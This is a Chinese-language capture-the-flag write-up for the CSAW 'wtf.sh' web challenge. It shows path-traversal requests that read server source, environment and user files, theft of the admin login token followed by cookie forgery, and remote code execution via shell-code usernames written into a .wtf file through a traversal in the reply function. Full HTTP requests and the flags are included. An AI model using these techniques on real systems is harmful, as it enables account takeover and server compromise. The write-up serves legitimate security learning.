# wtf.sh-150

## 思路
```markdown
随便点击几个浏览可以看出题目环境是一个论坛，我们先注册个账号。
通过一些简单的测试像是sql注入，目录爆破，源码泄露这种常见套路走不通了
最后不断尝试：在展示文章的页面 post.wtf 下发现路径穿越漏洞
*（如果应用程序使用用户可控制的数据，以危险的方式访问位于应用服务器或其它后端文件系统的文件或目录，就会出现路径遍历。攻击者可以将路径遍历序列放入文件名内，向上回溯，从而访问服务器上的任何文件）
```

## wtf.sh（1） **路径穿越和cookie欺骗**
1. 获得网站源码
```http
	post.wtf?post=../ #获得网站源码
	## profile.wtf?user=../../../../../../../../../../proc/self/environ #获取有关我们所处位置和我们正在运行什么 可以获得PATH目录 搜寻PATH目录可以找到/usr/bin/get_flag1
```
	区别：当尝试加载post.wtf时，将获得一个空页面。这表明帖子是在目录中制作和加载的，可以通过访问来确认post.wtf?post=wwjnR 它加载与原始URL相同的页面
	（它试图打开的图片 /some/path/to/file/wwjnR//post.txt，两个正斜杠只是作为一个正斜杠处理）
2. 代码审计

   寻找flag关键字

   ```lua
   if contains 'user' ${!URL_PARAMS[@]} && file_exists "users/${URL_PARAMS['user']}"
   then
     local username=$(head -n 1 users/${URL_PARAMS['user']});
     echo "<h3>${username}'s posts:</h3>";
     echo "<ol>";
     get_users_posts "${username}" | while read -r post; do
         post_slug=$(awk -F/ '{print $2 "#" $3}' <<< "${post}");
         echo "<li><a href=\"/post.wtf?post=${post_slug}\">$(nth_line 2 "${post}" | htmlentities)</li>";
     done
     echo "</ol>";
     if is_logged_in && [[ "${COOKIES['USERNAME']}" = 'admin' ]] && [[ ${username} = 'admin' ]]
     then
         get_flag1
     fi
   fi
   ```

   源码告诉我们如果我们以*admin*身份登录并访问我们的配置文件，它将运行*get_flag1*。通过更多搜索，我们发现有一个目录可以存储*/users/中的*所有用户数据。因此，使用我们继续使用*？post =* inclusion漏洞。


读取所有站点的代码并探索目录结构。用户数据驻留在`users`目录中，其中用户文件包括用户名，密码哈希和登录令牌。使用第一个目录遍历，我们能够获得admin用户的登录令牌：

```http
GET /post.wtf?post=../users/ HTTP/1.1
Host: web.chal.csaw.io:8001
Cookie: USERNAME=test; TOKEN=HqZLY8GTURdESfMQn2+vDPRL4hpafUVU+ZeEhMGllZmEoD+AVa4Ucc9bIg9ht0r0gTzoDA927dK9OgLVxfHoYw==


HTTP/1.1 200 OK
[...]
<span class="post-poster">Posted by <a href="/profile.wtf?user=QNI5P">admin</a></span>
<span class="post-title">3f0b1ebe20e3682b1a5d701590ad76fb051d3a08</span>
<span class="post-body">ecX+3sJzU16hZeUPdfVy+h8kDJXsvR4DOd1QrliIBLRmgYs7sFqJvL/zRmUyhul5GtlLRbTHI/SWHMyNTcWPSw==</span>
[...]
```

发现自己注册的账号以及 admin 都被显示了出来，对比之前的 cookie，发现这个就是`TOKEN`的值。

admin 的`TOKEN`也知道了，可以进行 cookie 欺骗。另外一串东西发现是密码的 sha1。

#### 法一 未尝试

在code（`user_functions.sh`）中看到，只要用户在users_lookup中注册目录，就会使用用户名的SHA1作为directoroy名称创建。为了获得管理员用户访问管理员配置文件的正确用户ID，我们只需读取用户ID文件即可：

```http
GET /profile.wtf?user=../users_lookup/4015bc9ee91e437d90df83fb64fbbe312d9c9f05/userid HTTP/1.1
Host: web.chal.csaw.io:8001
Cookie: USERNAME=test; TOKEN=HqZLY8GTURdESfMQn2+vDPRL4hpafUVU+ZeEhMGllZmEoD+AVa4Ucc9bIg9ht0r0gTzoDA927dK9OgLVxfHoYw==


HTTP/1.1 200 OK
[...]
<h3>QNI5P's posts:</h3>
[...]
```

现在我们可以获得旗帜：

```http
GET /profile.wtf?user=QNI5P HTTP/1.1
Host: web.chal.csaw.io:8001
Cookie: USERNAME=admin; TOKEN=ecX+3sJzU16hZeUPdfVy+h8kDJXsvR4DOd1QrliIBLRmgYs7sFqJvL/zRmUyhul5GtlLRbTHI/SWHMyNTcWPSw==


HTTP/1.1 200 OK
[...]
Flag: flag{l00k_at_m3_I_am_th3_4dm1n_n0w}
[...]
```

#### 法二
抓包，cookie欺骗
![img](https://blog.cindemor.com/static/upload/20190305/upload_008030a170c04487421660187e49bc67.png)

## wtf.sh（2）

挑战的第二部分有点复杂。我们不得不打电话`get_flag2`，但我们抛弃的代码没有包含任何参考。因此，我们必须深入研究代码以获取远程代码。

因为 wtf 不是常规的网页文件，故寻找解析 wtf 文件的代码

我们在代码中看到`wtf.sh`包含一个解析和执行.wtf文件的函数：

```sh
max_page_include_depth=64
page_include_depth=0
function include_page {
    # include_page <pathname>
    local pathname=$1
    local cmd=""
    [[ "${pathname:(-4)}" = '.wtf' ]];
    local can_execute=$?;
    page_include_depth=$(($page_include_depth+1))
    if [[ $page_include_depth -lt $max_page_include_depth ]]
    then
        local line;
        while read -r line; do
            # check if we're in a script line or not ($ at the beginning implies script line)
            # also, our extension needs to be .wtf
            [[ "$" = "${line:0:1}" && ${can_execute} = 0 ]];
            is_script=$?;

            # execute the line.
            if [[ $is_script = 0 ]]
            then
                cmd+=$'\n'"${line#"$"}";
            else
                if [[ -n $cmd ]]
                then
                    eval "$cmd" || log "Error during execution of ${cmd}";
                    cmd=""
                fi
                echo $line
            fi
        done < ${pathname}
    else
        echo "<p>Max include depth exceeded!<p>"
    fi
}
```

能够解析并执行 wtf 文件，如果还能够上传 wtf 文件并执行的话，就可以达到控制服务器的目的。

所以我们要做的就是上传一个包含shell代码的文件，该代码以“$”开头，文件名需要有.wtf扩展名。我们在`post_functions.sh`文件中找到的一个有趣的功能是`reply`：

```sh
function reply {
    local post_id=$1;
    local username=$2;
    local text=$3;
    local hashed=$(hash_username "${username}");

    curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1);
    next_reply_id=$(awk '{print $1+1}' <<< "${curr_id}");
    next_file=(posts/${post_id}/${next_reply_id});
    echo "${username}" > "${next_file}";
    echo "RE: $(nth_line 2 < "posts/${post_id}/1")" >> "${next_file}";
    echo "${text}" >> "${next_file}";

    # add post this is in reply to to posts cache
    echo "${post_id}/${next_reply_id}" >> "users_lookup/${hashed}/posts";
}
```

回复帖子时，我们通过`post`GET参数提交了帖子ID 。此参数也容易受到路径遍历的影响，这允许我们定义要写入的文件名。
该函数还在文件的第一行写了用户名。因此，如果我们只是注册了一个包含有效shell命令的用户名，并将其写入以.wtf结尾的文件到我们可以访问该文件的目录中，那么就会给我们执行代码。
幸运的是，users_lookup文件没有包含`.noread`文件，因此我们可以将.wtf文件写入users_lookup。

简单的说就是：

评论功能的后台代码，这部分也是存在路径穿越的。

这行代码把用户名写在了评论文件的内容中：

```sh
echo "${username}" > "${next_file}";
```

如果用户名是一段可执行代码，而且写入的文件是 wtf 格式的，那么这个文件就能够执行我们想要的代码。

应用程序允许注册包含特殊字符的用户，例如“$”，但是包含空格的用户名存在错误。但是，因为bash允许执行没有空格的命令（例如{cat，/ etc / passwd}），所以这不是问题。所以我们注册了用户`${find,/,-iname,get_flag2}`并使用以下请求创建了回复：

```http
POST /reply.wtf?post=../users_lookup/sh.wtf%09 HTTP/1.1
Host: web.chal.csaw.io:8001
Content-Type: application/x-www-form-urlencoded
Cookie: USERNAME=${find,/,-iname,get_flag2}; TOKEN=Uf7xrOWHXoRzLdVS6drbhjHyIZVsCXFgQYnOG01UhENS1aaajeezaWrgpOno8HBljrHOMmfbQUY+rES1bWlNWQ==

text=asd&submit=
```

**请注意，文件名前缀`%09`为水平制表符。这是必需的，因为reply函数会将名称解释为目录名称，命令将失败。**

当我们现在调用该文件时，我们得到以下响应：

```http
GET /users_lookup/sh.wtf HTTP/1.1
Host: web.chal.csaw.io:8001
Cookie: USERNAME=${find,/,-iname,get_flag2}; TOKEN=Uf7xrOWHXoRzLdVS6drbhjHyIZVsCXFgQYnOG01UhENS1aaajeezaWrgpOno8HBljrHOMmfbQUY+rES1bWlNWQ==


HTTP/1.1 200 OK
[...]
/usr/bin/get_flag2
RE:
asd
```

所以这`get_flag2`是一个驻留的二进制文件`/usr/bin/`。我们现在只需要创建用户`$/usr/bin/get_flag2`并再次发送回复请求：

```http
POST /reply.wtf?post=../users_lookup/sh.wtf%09 HTTP/1.1
Host: web.chal.csaw.io:8001
Content-Length: 16
Content-Type: application/x-www-form-urlencoded
Cookie: USERNAME=$/usr/bin/get_flag2; TOKEN=neappNHO7cRKNouqa1+xBYq8AWNTE2PqLcxh0JPFkaaNF5UOXc/C2fOL+JkQP65OZxc9BUkRnt1h8Z98bFbHZA==

text=asd&submit=

--

GET /users_lookup/sh.wtf HTTP/1.1
Host: web.chal.csaw.io:8001


HTTP/1.1 200 OK
[...]
Flag: flag{n0b0dy_exp3c75_th3_p4r3nth3s1s_1nqu1s1t10n}
ÿÿÿ
RE:
asd
```